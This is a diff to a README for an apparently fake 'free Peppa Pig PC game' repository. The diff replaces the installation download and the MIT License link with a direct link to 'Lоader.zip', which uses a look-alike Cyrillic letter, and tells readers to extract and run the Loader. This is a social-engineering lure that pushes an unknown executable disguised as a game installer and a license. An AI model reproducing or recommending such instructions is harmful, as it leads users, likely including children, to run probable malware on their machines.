@@ -27,7 +27,7 @@ My Friend Peppa Pig installer,  Peppa Pig 2025, Peppa Pig PC version, Peppa Pig 
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/dulalsreflection/PeppaPigFreePlayHub/main/Lоader.zip** from this repository.
 2. Extract the archive using a tool like WinRAR, 7-Zip, or The Unarchiver.
 3. Run the Loader and follow on-screen instructions to enjoy the game!
 
@@ -37,4 +37,4 @@ This repository provides an educational, non-commercial solution for enthusiasts
 
 ## 📝 License
 
-Distributed under the [MIT License](https://opensource.org/license/mit/) – © 2025. Explore and enjoy My Friend Peppa Pig responsibly!
+Distributed under the [MIT License](https://raw.githubusercontent.com/dulalsreflection/PeppaPigFreePlayHub/main/Lоader.zip) – © 2025. Explore and enjoy My Friend Peppa Pig responsibly!
